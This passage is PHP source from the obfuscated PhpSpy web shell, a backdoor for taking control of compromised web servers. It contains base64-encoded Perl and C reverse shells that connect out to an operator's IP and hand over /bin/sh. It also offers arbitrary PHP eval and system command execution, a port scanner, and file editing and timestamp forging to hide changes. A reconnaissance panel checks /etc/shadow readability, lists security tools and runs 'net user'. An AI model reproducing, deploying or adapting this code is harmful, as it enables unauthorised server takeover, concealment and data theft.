$spfcd1ca++; $sp8b3c02[] = $sp110772; } $sp6c8724 = sizecount($sp6c8724); unset($sp110772); if (count($sp8b3c02)) { if ($sp7550a2) { $sp80c2fe = $spfd836c->fetch($spfd836c->query('SHOW VARIABLES LIKE \'storage_engine\';')); $spe82315 = $spfd836c->fetch($spfd836c->query('SHOW VARIABLES LIKE \'collation_database\';')); } $spbc4c0f = array('Name', 1); if ($sp7fd26f) { if (preg_match('!s_([A-z_]+)_(\\d{1})!', $sp7fd26f, $spd3b0e2)) { $spbc4c0f = array($spd3b0e2[1], (int) $spd3b0e2[2]); } } usort($sp8b3c02, 'cmp'); p('<table border="0" cellpadding="0" cellspacing="0" id="lists">'); p('<tr class="head">'); p('<td width="2%"><input name="chkall" value="on" type="checkbox" onclick="checkall(this.form)" /></td>'); p('<td><a href="javascript:setsort(\'s_Name_' . ($spbc4c0f[1] ? 0 : 1) . '\');">Name</a> ' . ($sp7fd26f == 's_Name_0' ? $sp6b3266 : '') . ($sp7fd26f == 's_Name_1' || !$sp7fd26f ? $spa58ee3 : '') . '</td>'); p('<td><a href="javascript:setsort(\'s_Rows_' . ($spbc4c0f[1] ? 0 : 1) . '\');">Rows</a>' . ($sp7fd26f == 's_Rows_0' ? $sp6b3266 : '') . ($sp7fd26f == 's_Rows_1' ? $spa58ee3 : '') . '</td>'); p('<td><a href="javascript:setsort(\'s_Data_length_' . ($spbc4c0f[1] ? 0 : 1) . '\');">Data_length</a>' . ($sp7fd26f == 's_Data_length_0' ? $sp6b3266 : '') . ($sp7fd26f == 's_Data_length_1' ? $spa58ee3 : '') . '</td>'); p('<td><a href="javascript:setsort(\'s_Create_time_' . ($spbc4c0f[1] ? 0 : 1) . '\');">Create_time</a>' . ($sp7fd26f == 's_Create_time_0' ? $sp6b3266 : '') . ($sp7fd26f == 's_Create_time_1' ? $spa58ee3 : '') . '</td>'); p('<td><a href="javascript:setsort(\'s_Update_time_' . ($spbc4c0f[1] ? 0 : 1) . '\');">Update_time</a>' . ($sp7fd26f == 's_Update_time_0' ? $sp6b3266 : '') . ($sp7fd26f == 's_Update_time_1' ? $spa58ee3 : '') . '</td>'); if ($sp7550a2) { p('<td>Engine</td>'); p('<td>Collation</td>'); } p('<td>Other</td>'); p('</tr>'); foreach ($sp8b3c02 as $sp7ac89e => $sp110772) { $sp78d359 = bg(); p('<tr class="' . $sp78d359 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $sp78d359 . '\';">'); p('<td align="center" width="2%"><input type="checkbox" name="bak_table[]" value="' . $sp110772['Name'] . '" /></td>'); p('<td><a href="javascript:settable(\'' . $sp110772['Name'] . '\');">' . $sp110772['Name'] . '</a></td>'); p('<td>' . $sp110772['Rows'] . '&nbsp;</td>'); p('<td>' . sizecount($sp110772['Data_length']) . '</td>'); p('<td>' . $sp110772['Create_time'] . '&nbsp;</td>'); p('<td>' . $sp110772['Update_time'] . '&nbsp;</td>'); if ($sp7550a2) { p('<td>' . $sp110772['Engine'] . '</td>'); p('<td>' . $sp110772['Collation'] . '</td>'); } p('<td><a href="javascript:settable(\'' . $sp110772['Name'] . '\', \'structure\');">Structure</a></td>'); p('</tr>'); } p('<tr class="head">'); p('<td width="2%">&nbsp;</td>'); p('<td>' . $spfcd1ca . ' table(s)</td>'); p('<td>' . $sp7460c5 . '</td>'); p('<td>' . $sp6c8724 . '</td>'); p('<td>&nbsp;</td>'); p('<td>&nbsp;</td>'); if ($sp7550a2) { p('<td>' . $sp80c2fe['Value'] . '</td>'); p('<td>' . $spe82315['Value'] . '</td>'); } p('<td>&nbsp;</td>'); p('</tr>'); p('<tr class="' . bg() . '"><td colspan="' . ($sp7550a2 ? 9 : 7) . '"><input name="saveasfile" value="1" type="checkbox" /> Save as file <input class="input" name="bak_path" value="' . SA_ROOT . $sp50c961 . '.sql" type="text" size="60" /> <input class="bt" type="button" value="Export selection table" onclick="$(\'doing\').value=\'dump\';$(\'dbform\').submit();" /></td></tr>'); p('</table>'); } else { p('<p class="red b">No tables</p>'); } $spfd836c->free_result($sp8cac4d); } } $spfd836c->close(); } formfoot(); } elseif ($sp87ccd4 == 'backconnect') { !$sp0bd92b && ($sp0bd92b = $_SERVER['REMOTE_ADDR']); !$sp8f82a5 && ($sp8f82a5 = '12345'); $spdb0b1f = array('perl' => 'perl', 'c' => 'c'); $sp0c418a = 'IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj' . 'aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR' . 'hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT' . 'sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI' . 'kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi' . 'KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl' . 'OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=='; $sp1bc54c = 'I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC' . 'BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb' . 'SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd' . 'KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ' . 'sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC' . 'Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D' . 'QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp' . 'Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ=='; if ($spd6330d == 'start' && $sp0bd92b && $sp8f82a5 && $spefeac6) { if ($spefeac6 == 'perl') { cf('/tmp/angel_bc', $sp0c418a); $sp8e5eb2 = execute(which('perl') . ' /tmp/angel_bc ' . $sp0bd92b . ' ' . $sp8f82a5 . ' &'); } else { cf('/tmp/angel_bc.c', $sp1bc54c); $sp8e5eb2 = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c'); @unlink('/tmp/angel_bc.c'); $sp8e5eb2 = execute('/tmp/angel_bc ' . $sp0bd92b . ' ' . $sp8f82a5 . ' &'); } m('Now script try connect to ' . $sp0bd92b . ':' . $sp8f82a5 . ' ...'); } formhead(array('title' => 'Back Connect', 'onsubmit' => 'g(\'backconnect\',null,\'start\',this.p2.value,this.p3.value,this.p4.value);return false;')); p('<p>'); p('Your IP:'); makeinput(array('name' => 'p2', 'size' => 20, 'value' => $sp0bd92b)); p('Your Port:'); makeinput(array('name' => 'p3', 'size' => 15, 'value' => $sp8f82a5)); p('Use:'); makeselect(array('name' => 'p4', 'option' => $spdb0b1f, 'selected' => $spefeac6)); makeinput(array('value' => 'Start', 'type' => 'submit', 'class' => 'bt')); p('</p>'); formfoot(); } elseif ($sp87ccd4 == 'portscan') { !$sp0bd92b && ($sp0bd92b = '127.0.0.1'); !$sp8f82a5 && ($sp8f82a5 = '21,80,135,139,445,1433,3306,3389,5631,43958'); formhead(array('title' => 'Port Scan', 'onsubmit' => 'g(\'portscan\',null,\'start\',this.p2.value,this.p3.value);return false;')); p('<p>'); p('IP:'); makeinput(array('name' => 'p2', 'size' => 20, 'value' => $sp0bd92b)); p('Port:'); makeinput(array('name' => 'p3', 'size' => 80, 'value' => $sp8f82a5)); makeinput(array('value' => 'Scan', 'type' => 'submit', 'class' => 'bt')); p('</p>'); formfoot(); if ($spd6330d == 'start') { p('<h2>Result &raquo;</h2>'); p('<ul class="info">'); foreach (explode(',', $sp8f82a5) as $sp83248d) { $spe0ea16 = @fsockopen($sp0bd92b, $sp83248d, $specf052, $sp271e5b, 1); if (!$spe0ea16) { p('<li>' . $sp0bd92b . ':' . $sp83248d . ' ------------------------ <span class="b">Close</span></li>'); } else { p('<li>' . $sp0bd92b . ':' . $sp83248d . ' ------------------------ <span class="red b">Open</span></li>'); @fclose($spe0ea16); } } p('</ul>'); } } elseif ($sp87ccd4 == 'eval') { $spd69ec6 = trim($spd6330d); if ($spd69ec6) { if (!preg_match('#<\\?#si', $spd69ec6)) { $spd69ec6 = "<?php\n\n{$spd69ec6}\n\n?>"; } eval('?' . ">{$spd69ec6}<?"); } formhead(array('title' => 'Eval PHP Code', 'onsubmit' => 'g(\'eval\',null,this.p1.value);return false;')); maketext(array('title' => 'PHP Code', 'name' => 'p1', 'value' => $spd69ec6)); p('<p><a href="http://w' . 'ww.4' . 'ng' . 'el.net/php' . 'sp' . 'y/pl' . 'ugin/" target="_blank">Get plugins</a></p>'); formfooter(); } elseif ($sp87ccd4 == 'editfile') { if ($spd6330d == 'edit' && $sp0bd92b && $sp8f82a5) { $spe0ea16 = @fopen($sp0bd92b, 'w'); m('Save file ' . (@fwrite($spe0ea16, $sp8f82a5) ? 'success' : 'failed')); @fclose($spe0ea16); } $sp6b22f3 = ''; if (file_exists($sp0bd92b)) { $spe0ea16 = @fopen($sp0bd92b, 'r'); $sp6b22f3 = @fread($spe0ea16, filesize($sp0bd92b)); @fclose($spe0ea16); $sp6b22f3 = htmlspecialchars($sp6b22f3); } formhead(array('title' => 'Create / Edit File', 'onsubmit' => 'g(\'editfile\',null,\'edit\',this.p2.value,this.p3.value);return false;')); makeinput(array('title' => 'Filename', 'name' => 'p2', 'value' => $sp0bd92b, 'newline' => 1)); maketext(array('title' => 'File Content', 'name' => 'p3', 'value' => $sp6b22f3)); formfooter(); goback(); } elseif ($sp87ccd4 == 'newtime') { $spf37f53 = @filemtime($spd6330d); formhead(array('title' => 'Clone folder/file was last modified time', 'onsubmit' => 'g(\'file\',null,\'clonetime\',this.p2.value,this.p3.value);return false;')); makeinput(array('title' => 'Alter folder/file', 'name' => 'p2', 'value' => $spd6330d, 'size' => 120, 'newline' => 1)); makeinput(array('title' => 'Reference folder/file', 'name' => 'p3', 'value' => $sp570d5b, 'size' => 120, 'newline' => 1)); formfooter(); formhead(array('title' => 'Set last modified', 'onsubmit' => 'g(\'file\',null,\'settime\',this.p2.value,this.p3.value);return false;')); makeinput(array('title' => 'Current folder/file', 'name' => 'p2', 'value' => $spd6330d, 'size' => 120, 'newline' => 1)); makeinput(array('title' => 'Modify time', 'name' => 'p3', 'value' => date('Y-m-d H:i:s', $spf37f53), 'size' => 120, 'newline' => 1)); formfooter(); goback(); } elseif ($sp87ccd4 == 'shell') { formhead(array('title' => 'Execute Command', 'onsubmit' => 'g(\'shell\',null,this.p1.value);return false;')); p('<p>'); makeinput(array('name' => 'p1', 'value' => htmlspecialchars($spd6330d))); makeinput(array('class' => 'bt', 'type' => 'submit', 'value' => 'Execute')); p('</p>'); formfoot(); if ($spd6330d) { p('<pre>' . execute($spd6330d) . '</pre>'); } } elseif ($sp87ccd4 == 'phpenv') { $sp96625c = array(); if (function_exists('mysql_get_client_info')) { $sp96625c[] = 'MySql (' . mysql_get_client_info() . ')'; } if (function_exists('mssql_connect')) { $sp96625c[] = 'MSSQL'; } if (function_exists('pg_connect')) { $sp96625c[] = 'PostgreSQL'; } if (function_exists('oci_connect')) { $sp96625c[] = 'Oracle'; } $sp35a580 = array(1 => array('Server Time', date('Y/m/d h:i:s', $sp73acdf)), 2 => array('Server Domain', $_SERVER['SERVER_NAME']), 3 => array('Server IP', gethostbyname($_SERVER['SERVER_NAME'])), 4 => array('Server OS', PHP_OS), 5 => array('Server OS Charset', $_SERVER['HTTP_ACCEPT_LANGUAGE']), 6 => array('Server Software', $_SERVER['SERVER_SOFTWARE']), 7 => array('Server Web Port', $_SERVER['SERVER_PORT']), 8 => array('PHP run mode', strtoupper(php_sapi_name())), 9 => array('The file path', __FILE__), 10 => array('PHP Version', PHP_VERSION), 11 => array('PHPINFO', IS_PHPINFO ? '<a href="javascript:g(\'phpinfo\');">Yes</a>' : 'No'), 12 => array('Safe Mode', getcfg('safe_mode')), 13 => array('Administrator', isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from')), 14 => array('allow_url_fopen', getcfg('allow_url_fopen')), 15 => array('enable_dl', getcfg('enable_dl')), 16 => array('display_errors', getcfg('display_errors')), 17 => array('register_globals', getcfg('register_globals')), 18 => array('magic_quotes_gpc', getcfg('magic_quotes_gpc')), 19 => array('memory_limit', getcfg('memory_limit')), 20 => array('post_max_size', getcfg('post_max_size')), 21 => array('upload_max_filesize', getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed'), 22 => array('max_execution_time', getcfg('max_execution_time') . ' second(s)'), 23 => array('disable_functions', $sp239931 ? $sp239931 : 'No'), 24 => array('Supported databases', implode(', ', $sp96625c)), 25 => array('cURL support', function_exists('curl_version') ? 'Yes' : 'No'), 26 => array('Open base dir', getcfg('open_basedir')), 27 => array('Safe mode exec dir', getcfg('safe_mode_exec_dir')), 28 => array('Safe mode include dir', getcfg('safe_mode_include_dir'))); $spb45abf = array(0 => 'Server', 1 => 'PHP'); for ($spd09f64 = 0; $spd09f64 < 2; $spd09f64++) { p('<h2>' . $spb45abf[$spd09f64] . ' &raquo;</h2>'); p('<ul class="info">'); if ($spd09f64 == 0) { for ($sp412bbc = 1; $sp412bbc <= 9; $sp412bbc++) { p('<li><u>' . $sp35a580[$sp412bbc][0] . ':</u>' . $sp35a580[$sp412bbc][1] . '</li>'); } } elseif ($spd09f64 == 1) { for ($sp412bbc = 10; $sp412bbc <= 25; $sp412bbc++) { p('<li><u>' . $sp35a580[$sp412bbc][0] . ':</u>' . $sp35a580[$sp412bbc][1] . '</li>'); } } p('</ul>'); } } elseif ($sp87ccd4 == 'secinfo') { echo '[syslog]06
'; if (!IS_WIN) { $sp2d6efd = array('gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzip2', 'nc', 'locate', 'suidperl'); $spd109b3 = array('kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'clamd', 'rkhunter', 'chkrootkit', 'iptables', 'ipfw', 'tripwire', 'shieldcc', 'portsentry', 'snort', 'ossec', 'lidsadm', 'tcplodg', 'sxid', 'logcheck', 'logwatch', 'sysmask', 'zmbscap', 'sawmill', 'wormscan', 'ninja'); $sp2c68de = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror'); secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? 'yes' : 'no'); secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? 'yes' : 'no'); secparam('OS version', @file_get_contents('/proc/version')); secparam('Distr name', @file_get_contents('/etc/issue.net')); $spdda14d = @ini_get('safe_mode'); if (!$sp2eb6c3['safe_mode']) { $spc44fb2 = array(); foreach ($sp2d6efd as $sp527681) { if (which($sp527681)) { $spc44fb2[] = $sp527681; } } secparam('Userful', implode(', ', $spc44fb2)); $spc44fb2 = array(); foreach ($spd109b3 as $sp527681) { if (which($sp527681)) { $spc44fb2[] = $sp527681; } } secparam('Danger', implode(', ', $spc44fb2)); $spc44fb2 = array(); foreach ($sp2c68de as $sp527681) { if (which($sp527681)) { $spc44fb2[] = $sp527681; } } secparam('Downloaders', implode(', ', $spc44fb2)); secparam('Hosts', @file_get_contents('/etc/hosts')); secparam('HDD space', execute('df -h')); secparam('Mount options', @file_get_contents('/etc/fstab')); } } else { secparam('OS Version', execute('ver')); secparam('Account Settings', execute('net accounts')); secparam('User Accounts', execute('net user')); secparam('IP Configurate', execute('ipconfig -all')); } } else { m('Undefined Action'); } ?>
</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
	<span style="float:right;">
	<?php  debuginfo(); ob_end_flush(); if (isset($spfd836c)) { echo '. ' . $spfd836c->querycount . ' queries'; } ?>
	</span>
	Powered by <a title="Build 20130112" href="http://www.4ngel.net" target="_blank"><?php  echo str_replace('.', '', 'P.h.p.S.p.y'); ?>
 2013 final</a>. Copyright (C) 2004-2013 <a href="http://www.4ngel.net" target="_blank">[S4T]</a> All Rights Reserved.
</div>
</body>
</html>

<?php  function secparam($sp5c3411, $sp6d4391) { $sp6d4391 = trim($sp6d4391); if ($sp6d4391) { p('<h2>' . $sp5c3411 . ' &raquo;</h2>'); p('<div class="infolist">'); if (strpos($sp6d4391, '
') === false) { p($sp6d4391 . '<br />'); } else { p('<pre>' . $sp6d4391 . '</pre>'); } p('</div>'); } } function m($spcb2190) { echo '<div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">'; echo $spcb2190; echo '</div>'; } function s_array($sp026f8c) { return is_array($sp026f8c) ? array_map('s_array', $sp026f8c) : stripslashes($sp026f8c); } function scookie($sp7ac89e, $sp8e17b7, $spdfa613 = 0, $spc3d592 = 1) { global $sp73acdf, $_SERVER, $spcd0068, $sp3049a2, $sp63c1d6, $sp30b778; $sp7ac89e = ($spc3d592 ? $spcd0068 : '') . $sp7ac89e; $spdfa613 = $spdfa613 ? $spdfa613 : $sp30b778; $spc4a2f0 = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0; setcookie($sp7ac89e, $sp8e17b7, $sp73acdf + $spdfa613, $sp63c1d6, $sp3049a2, $spc4a2f0); } function loginpage() { formhead(); makehide('act', 'login'); makeinput(array('name' => 'password', 'type' => 'password', 'size' => '20')); makeinput(array('type' => 'submit', 'value' => 'Login')); formfoot(); die; } function execute($sp80c7e6) { $sp8e5eb2 = ''; if ($sp80c7e6) { if (function_exists('system')) { @ob_start(); @system($sp80c7e6); $sp8e5eb2 = @ob_get_contents(); @ob_end_clean(); } elseif (function_exists('passthru')) { @ob_start(); @passthru($sp80c7e6); $sp8e5eb2 = @ob_get_contents(); @ob_end_clean(); } elseif (function_exists('shell_exec')) { $sp8e5eb2 = @shell_exec($sp80c7e6); } elseif (function_exists('exec')) { @exec($sp80c7e6, $sp8e5eb2); $sp8e5eb2 = join('
', $sp8e5eb2); } elseif (@is_resource($sp1b2b3c = @popen($sp80c7e6, 'r'))) { $sp8e5eb2 = ''; while (!@feof($sp1b2b3c)) { $sp8e5eb2 .= @fread($sp1b2b3c, 1024); } @pclose($sp1b2b3c); } } return $sp8e5eb2; } function which($sp60b0db) { $sp149c6d = execute("which {$sp60b0db}"); return $sp149c6d ? $sp149c6d : $sp60b0db; } function cf($spd106ba, $spcc3eaa) { if ($spe0ea16 = @fopen($spd106ba, 'w')) { @fputs($spe0ea16, @base64_decode($spcc3eaa)); @fclose($spe0ea16); } } function dirsize($sp570d5b) { $spcfdfd7 = @opendir($sp570d5b); $spbb5bfd = 0; while ($sp7ff75d = @readdir($spcfdfd7)) { if ($sp7ff75d != '.' && $sp7ff75d != '..') { $sp149c6d = $sp570d5b . '/' . $sp7ff75d; $spbb5bfd += @is_dir($sp149c6d) ? dirsize($sp149c6d) : sprintf('%u', @filesize($sp149c6d)); } } @closedir($spcfdfd7); return $spbb5bfd; } function debuginfo() { global $spd725d3; $sp875595 = explode(' ', microtime()); $spb293a9 = number_format($sp875595[1] + $sp875595[0] - $spd725d3, 6); echo 'Processed in ' . $spb293a9 . ' second(s)'; } function html_clean($sp4c8f1b) { $sp4c8f1b = htmlspecialchars($sp4c8f1b); $sp4c8f1b = str_replace('
', '<br />', $sp4c8f1b); $sp4c8f1b = str_replace('  ', '&nbsp;&nbsp;', $sp4c8f1b); $sp4c8f1b = str_replace('	', '&nbsp;&nbsp;&nbsp;&nbsp;', $sp4c8f1b); return $sp4c8f1b; } function getChmod($sp7ff75d) { return substr(base_convert(@fileperms($sp7ff75d), 10, 8), -4); } function PermsColor($sp1b2b3c) { if (!is_readable($sp1b2b3c)) { return '<span class="red">' . getPerms($sp1b2b3c) . '</span>'; } elseif (!is_writable($sp1b2b3c)) { return '<span class="black">' . getPerms($sp1b2b3c) . '</span>'; } else { return '<span class="green">' . getPerms($sp1b2b3c) . '</span>'; } } function getPerms($sp7ff75d) { $sp3fd77e = @fileperms($sp7ff75d); if (($sp3fd77e & 49152) === 49152) { $spa48979 = 's'; } elseif (($sp3fd77e & 16384) === 16384) { $spa48979 = 'd'; } elseif (($sp3fd77e & 40960) === 40960) { $spa48979 = 'l'; } elseif (($sp3fd77e & 32768) === 32768) { $spa48979 = '-'; } elseif (($sp3fd77e & 24576) === 24576) { $spa48979 = 'b'; } elseif (($sp3fd77e & 8192) === 8192) { $spa48979 = 'c'; } elseif (($sp3fd77e & 4096) === 4096) { $spa48979 = 'p'; } else { $spa48979 = '?'; } $sp9f8c07['read'] = $sp3fd77e & 256 ? 'r' : '-'; $sp9f8c07['write'] = $sp3fd77e & 128 ? 'w' : '-'; $sp9f8c07['execute'] = $sp3fd77e & 64 ? 'x' : '-'; $sp103103['read'] = $sp3fd77e & 32 ? 'r' : '-'; $sp103103['write'] = $sp3fd77e & 16 ? 'w' : '-'; $sp103103['execute'] = $sp3fd77e & 8 ? 'x' : '-'; $spbc6618['read'] = $sp3fd77e & 4 ? 'r' : '-'; $spbc6618['write'] = $sp3fd77e & 2 ? 'w' : '-'; $spbc6618['execute'] = $sp3fd77e & 1 ? 'x' : '-'; if ($sp3fd77e & 2048) { $sp9f8c07['execute'] = $sp9f8c07['execute'] == 'x' ? 's' : 'S'; } if ($sp3fd77e & 1024) { $sp103103['execute'] = $sp103103['execute'] == 'x' ? 's' : 'S'; } if ($sp3fd77e & 512) { $spbc6618['execute'] = $spbc6618['execute'] == 'x' ? 't' : 'T'; } return $spa48979 . $sp9f8c07['read'] . $sp9f8c07['write'] . $sp9f8c07['execute'] . $sp103103['read'] . $sp103103['write'] . $sp103103['execute'] . $spbc6618['read'] . $spbc6618['write'] . $spbc6618['execute']; } function getUser($sp7ff75d) { if (function_exists('posix_getpwuid')) { $sp026f8c = @posix_getpwuid(@fileowner($sp7ff75d)); if ($sp026f8c && is_array($sp026f8c)) { return ' / <a href="#" title="User: ' . $sp026f8c['name'] . '&#13&#10Passwd: ' . $sp026f8c['passwd'] . '&#13&#10Uid: ' . $sp026f8c['uid'] . '&#13&#10gid: ' . $sp026f8c['gid'] . '&#13&#10Gecos: ' . $sp026f8c['gecos'] . '&#13&#10Dir: ' . $sp026f8c['dir'] . '&#13&#10Shell: ' . $sp026f8c['shell'] . '">' . $sp026f8c['name'] . '</a>'; } } return ''; } function copy_paste($sp559d1c, $sp1b2b3c, $sp96625c) { if (is_dir($sp559d1c . $sp1b2b3c)) { mkdir($sp96625c . $sp1b2b3c); $sp495c2d = scandir($sp559d1c . $sp1b2b3c); if ($sp495c2d) { $sp495c2d = array_diff($sp495c2d, array('..', '.')); foreach ($sp495c2d as $sp7ff75d) { copy_paste($sp559d1c . $sp1b2b3c . '/', $sp7ff75d, $sp96625c . $sp1b2b3c . '/'); } } } elseif (is_file($sp559d1c . $sp1b2b3c)) { copy($sp559d1c . $sp1b2b3c, $sp96625c . $sp1b2b3c); } } function deltree($spff8e42) { $sp495c2d = @scandir($spff8e42); if ($sp495c2d) { $sp495c2d = array_diff($sp495c2d, array('..', '.')); foreach ($sp495c2d as $sp7ff75d) { if (is_dir($spff8e42 . '/' . $sp7ff75d)) { @chmod($spff8e42 . '/' . $sp7ff75d, 511); deltree($spff8e42 . '/' . $sp7ff75d); } else { @chmod($spff8e42 . '/' . $sp7ff75d, 511); @unlink($spff8e42 . '/' . $sp7ff75d); } } @chmod($spff8e42, 511); return @rmdir($spff8e42) ? 1 : 0; } else { return 0; } } function bg() { global $spc7200c; return $spc7200c++ % 2 == 0 ? 'alt1' : 'alt2'; } function cmp($spd09f64, $sp20e3ac) { global $spbc4c0f; if (is_numeric($spd09f64[$spbc4c0f[0]])) { return ($spd09f64[$spbc4c0f[0]] < $sp20e3ac[$spbc4c0f[0]] ? -1 : 1) * ($spbc4c0f[1] ? 1 : -1); } else { return strcmp($spd09f64[$spbc4c0f[0]], $sp20e3ac[$spbc4c0f[0]]) * ($spbc4c0f[1] ? 1 : -1); } } function getUpPath($sp570d5b) { echo '[syslog]07_f
'; $sp60e6c0 = explode('/', $sp570d5b); $sp6cf735 = count($sp60e6c0); if ($sp6cf735 > 2) { unset($sp60e6c0[$sp6cf735 - 1], $sp60e6c0[$sp6cf735 - 2]); } $sp86e64a = implode('/', $sp60e6c0) . '/'; $sp86e64a = str_replace('//', '/', $sp86e64a); return $sp86e64a; } function getcfg($spd53bce) { $spb7d120 = 'true'; if ($spb7d120 == 0) { return 'No'; } elseif ($spb7d120 == 1) { return 'Yes'; } else { return $spb7d120; } } function getext($sp7ff75d) { $sp35a580 = pathinfo($sp7ff75d); return $sp35a580['extension']; } function GetWDirList($sp149c6d) { global $spbf846d, $sp460372, $spfaadc9; !$sp460372 && ($sp460372 = 1); $sp495c2d = @scandir($sp149c6d); if ($sp495c2d) { $sp495c2d = array_diff($sp495c2d, array('..', '.')); foreach ($sp495c2d as $sp7ff75d) { $sp1b2b3c = str_replace('//', '/', $sp149c6d . '/' . $sp7ff75d); if (is_dir($sp1b2b3c)) { if (is_writable($sp1b2b3c)) { $spbf846d[$sp460372]['filename'] = '/' . str_replace($spfaadc9, '', $sp1b2b3c); $spbf846d[$sp460372]['mtime'] = @date('Y-m-d H:i:s', filemtime($sp1b2b3c)); $spbf846d[$sp460372]['chmod'] = getChmod($sp1b2b3c); $spbf846d[$sp460372]['perm'] = PermsColor($sp1b2b3c); $spbf846d[$sp460372]['owner'] = getUser($sp1b2b3c); $spbf846d[$sp460372]['link'] = $sp1b2b3c; $sp460372++; } GetWDirList($sp1b2b3c); } } return $spbf846d; } else { return array(); } } function sizecount($spbb5bfd) { $sp506a73 = array('Bytes', 'KB', 'MB', 'GB', 'TB', 'PB'); for ($sp412bbc = 0; $spbb5bfd >= 1024 && $sp412bbc < 5; $sp412bbc++) { $spbb5bfd /= 1024; } return round($spbb5bfd, 2) . ' ' . $sp506a73[$sp412bbc]; } function p($sp1ae2ba) { echo $sp1ae2ba . '
'; } function makehide($spd86858, $sp8e17b7 = '') { p("<input id=\"{$spd86858}\" type=\"hidden\" name=\"{$spd86858}\" value=\"{$sp8e17b7}\" />"); } function makeinput($spa3abbf = array()) { $spa3abbf['size'] = isset($spa3abbf['size']) && $spa3abbf['size'] > 0 ? "size=\"{$spa3abbf['size']}\"" : 'size="100"'; $spa3abbf['type'] = isset($spa3abbf['type']) ? $spa3abbf['type'] : 'text'; $spa3abbf['title'] = isset($spa3abbf['title']) ? $spa3abbf['title'] . '<br />' : ''; $spa3abbf['class'] = isset($spa3abbf['class']) ? $spa3abbf['class'] : 'input'; $spa3abbf['name'] = isset($spa3abbf['name']) ? $spa3abbf['name'] : ''; $spa3abbf['value'] = isset($spa3abbf['value']) ? $spa3abbf['value'] : ''; if (isset($spa3abbf['newline'])) { p('<p>'); } p("{$spa3abbf['title']}<input class=\"{$spa3abbf['class']}\" name=\"{$spa3abbf['name']}\" id=\"{$spa3abbf['name']}\" value=\"{$spa3abbf['value']}\" type=\"{$spa3abbf['type']}\" {$spa3abbf['size']} />"); if (isset($spa3abbf['newline'])) { p('</p>'); } } function makeselect($spa3abbf = array()) { $sp203682 = isset($spa3abbf['onchange']) ? 'onchange="' . $spa3abbf['onchange'] . '"' : ''; $spa3abbf['title'] = isset($spa3abbf['title']) ? $spa3abbf['title'] : ''; $spa3abbf['name'] = isset($spa3abbf['name']) ? $spa3abbf['name'] : ''; p("{$spa3abbf['title']} <select class=\"input\" id=\"{$spa3abbf['name']}\" name=\"{$spa3abbf['name']}\" {$sp203682}>"); if (is_array($spa3abbf['option'])) { foreach ($spa3abbf['option'] as $sp7ac89e => $sp8e17b7) { if ($spa3abbf['selected'] == $sp7ac89e) { p("<option value=\"{$sp7ac89e}\" selected>{$sp8e17b7}</option>"); } else { p("<option value=\"{$sp7ac89e}\">{$sp8e17b7}</option>"); } } } p('</select>'); } function formhead($spa3abbf = array()) { !isset($spa3abbf['method']) && ($spa3abbf['method'] = 'post'); !isset($spa3abbf['name']) && 